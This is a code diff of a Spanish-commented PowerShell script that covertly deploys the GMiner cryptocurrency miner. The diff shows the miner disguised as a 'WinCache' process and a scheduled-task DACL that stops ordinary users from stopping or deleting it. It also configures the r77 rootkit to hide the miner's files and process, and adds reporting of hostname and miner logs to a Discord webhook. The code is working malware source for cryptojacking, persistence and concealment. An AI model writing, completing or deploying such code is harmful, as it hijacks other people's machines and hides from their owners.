@@ -1,8 +1,8 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Deploys and runs GMiner using Task Scheduler with DACL protection on the task.
-    Includes r77 Rootkit and Safe Update.
+    Deploys and runs GMiner using Task Scheduler with DACL protection.
+    Sends real-time logs to Discord for full debugging.
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
 .EXAMPLE
@@ -75,6 +75,9 @@ public static class ProcessProtector {
 function Send-DiscordWebhook {
     param([string]$WebhookUrl, [string]$Title, [string]$Message, [int]$Color = 3066993)
     if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }
+    # Discord tiene un límite de 4096 caracteres por descripción
+    if ($Message.Length -gt 4000) { $Message = $Message.Substring(0, 3990) + "`n... [Truncado]" }
+    
     $payload = [ordered]@{
         embeds = @([ordered]@{ title = $Title; description = $Message; color = $Color; timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") })
     } | ConvertTo-Json -Depth 4 -Compress
@@ -142,27 +145,21 @@ if (-not $Run -and -not $NoElevate) {
 function Stop-Safe {
     Write-Host '[*] Deteniendo instancia anterior de forma segura...'
     
-    # 1. Quitar la protección de la tarea para poder detenerla
     $sd = (New-Object System.Security.AccessControl.DirectorySecurity)
-    $sddl = "*D:AI(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;AU)" # Permisos por defecto
+    $sddl = "*D:AI(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;AU)"
     try {
-        $taskPath = "\$TaskName"
         $taskService = New-Object -ComObject "Schedule.Service"
         $taskService.Connect()
         $folder = $taskService.GetFolder("\")
-        $task = $folder.GetTask($taskPath)
+        $task = $folder.GetTask("\$TaskName")
         if ($task) { $task.SetSecurityDescriptor($sddl, 0) }
     } catch {}
 
-    # 2. Detener la tarea
     Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
     
-    # 3. Matar los procesos
     $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
         Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
-    foreach ($w in $watchers) {
-        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
-    }
+    foreach ($w in $watchers) { Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue }
     
     Start-Sleep -Seconds 1
     Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
@@ -186,14 +183,44 @@ if ($Run) {
     New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
     if (-not $Wallet -or -not $Pool -or -not $Algo) { exit 1 }
 
+    # Variables para el buffer de logs a Discord
+    $logBuffer = New-Object System.Collections.ArrayList
+    $lastDiscordSend = Get-Date
+
     function Write-Session {
         param([string]$Msg, [string]$Level = 'INFO')
-        Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Msg" -Encoding UTF8
+        $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+        $formatted = "$ts [$Level] $Msg"
+        
+        # 1. Guardar siempre en disco
+        Add-Content -Path $LogFile -Value $formatted -Encoding UTF8
+
+        # 2. Enviar a Discord
+        if ($DiscordWebhook) {
+            if ($Level -eq 'FATAL' -or $Level -eq 'WARN') {
+                # Errores: Envío inmediato
+                $color = if ($Level -eq 'FATAL') { 15158332 } else { 16776960 }
+                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "🚨 Log [$Level]" -Message $formatted -Color $color | Out-Null
+            } else {
+                # Info normal: Acumular en buffer
+                [void]$logBuffer.Add($formatted)
+                if ((Get-Date) - $lastDiscordSend -gt [TimeSpan]::FromSeconds(30)) {
+                    if ($logBuffer.Count -gt 0) {
+                        $chunk = $logBuffer -join "`n"
+                        Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "📝 Logs (Últimos 30s)" -Message $chunk -Color 3066993 | Out-Null
+                        $logBuffer.Clear()
+                    }
+                    $lastDiscordSend = Get-Date
+                }
+            }
+        }
     }
 
+    Write-Session "Watcher iniciado (PID $PID)."
+    
     # --- DACL: Proteger el proceso actual ---
     $aclStatus = [ProcessProtector]::ProtectProcessDacl()
-    if ($aclStatus) { Write-Session "Watcher protegido con DACL." }
+    if ($aclStatus) { Write-Session "Watcher protegido con DACL." } else { Write-Session "No se pudo aplicar DACL." 'WARN' }
 
     # --- ROOTKIT ---
     try {
@@ -204,7 +231,7 @@ if ($Run) {
         $rk.SetValue([IO.Path]::GetRandomFileName(), $Root, 'String'); $rk.Close()  
         $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
         $rk.SetValue([IO.Path]::GetRandomFileName(), $PID, 'DWord'); $rk.Close()  
-        Write-Session "Rootkit r77 cargado."
+        Write-Session "Rootkit r77 cargado y configurado."
     } catch { Write-Session "Error en rootkit: $_" 'WARN' }
 
     $fatalRe = 'device not found|no (cuda|opencl|amd|nvidia|gpu) devices|unknown algo|authorization failed|out of memory|failed to (initialize|load)'
@@ -213,7 +240,7 @@ if ($Run) {
     $notifiedStart = $false
 
     while ($true) {
-        Write-Session "launching miner (attempt $($restarts + 1))"
+        Write-Session "Lanzando minero (intento $($restarts + 1))..."
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = $ExePath; $psi.Arguments = $argStr; $psi.WorkingDirectory = $Root
         $psi.UseShellExecute = $false; $psi.RedirectStandardOutput = $true; $psi.CreateNoWindow = $true
@@ -228,12 +255,12 @@ if ($Run) {
             } catch {}
 
             if (-not $notifiedStart -and $DiscordWebhook) {
-                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`n*(Task Scheduler + DACL Activados)*"
+                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool"
                 Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Minero Iniciado" -Message $msg -Color 3066993 | Out-Null
                 $notifiedStart = $true
             }
         } catch {
-            Write-Session "Fallo al iniciar: $_" 'FATAL'
+            Write-Session "Fallo crítico al iniciar el proceso: $_" 'FATAL'
             break
         }
 
@@ -244,18 +271,26 @@ if ($Run) {
         while (-not $proc.HasExited -or -not $q.IsEmpty) {
             $line = $null
             if ($q.TryDequeue([ref]$line)) {
+                # Enviamos cada línea del minero a la función Write-Session
                 $lvl = if ($line -match $fatalRe) { 'FATAL' } else { 'INFO' }
-                Add-Content -Path $LogFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$lvl] $line" -Encoding UTF8
-            } else { Start-Sleep -Milliseconds 200 }
+                Write-Session "MINER: $line" $lvl
+            } else { 
+                Start-Sleep -Milliseconds 200 
+            }
         }
 
         $proc.WaitForExit()
         Unregister-Event -SourceIdentifier $sub.Name -ErrorAction SilentlyContinue
         $proc.Dispose()
         
-        # Reinicio infinito a menos que se cierre
+        Write-Session "El minero se detuvo (Código de salida: $($proc.ExitCode))." 'WARN'
+        
         $restarts++
-        if ($restarts -ge 10) { $restarts = 0 } # Se resetea para no morir nunca
+        if ($restarts -ge 10) { 
+            Write-Session "Se alcanzaron 10 reinicios. Deteniendo por seguridad." 'FATAL'
+            break 
+        }
+        Write-Session "Reiniciando en 30 segundos..."
         Start-Sleep -Seconds 30
     }
     exit 0
@@ -325,18 +360,13 @@ Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Se
 # --- PROTECCIÓN DE LA TAREA (DACL) ---
 Write-Host '[*] Aplicando DACL a la Tarea Programada...'
 try {
-    # SDDL: D = DACL, AI = Herencia automática, 
-    # (A;;FA;;;SY) = Permitir Full Access a SYSTEM
-    # (A;;FA;;;BA) = Permitir Full Access a Built-in Admins
-    # (D;;DC;;;AU) = DENEGAR (D) el permiso de Borrar/Detener Tarea (DC) a Usuarios Autenticados (AU)
     $sddl = "*D:AI(A;;FA;;;SY)(A;;FA;;;BA)(D;;DC;;;AU)"
-    
     $taskService = New-Object -ComObject "Schedule.Service"
     $taskService.Connect()
     $folder = $taskService.GetFolder("\")
     $task = $folder.GetTask("\$TaskName")
     $task.SetSecurityDescriptor($sddl, 0)
-    Write-Host '[+] Tarea protegida. El usuario no podrá detenerla ni borrarla desde el Programador de Tareas.'
+    Write-Host '[+] Tarea protegida.'
 } catch {
     Write-Warning "No se pudo aplicar DACL a la tarea: $_"
 }
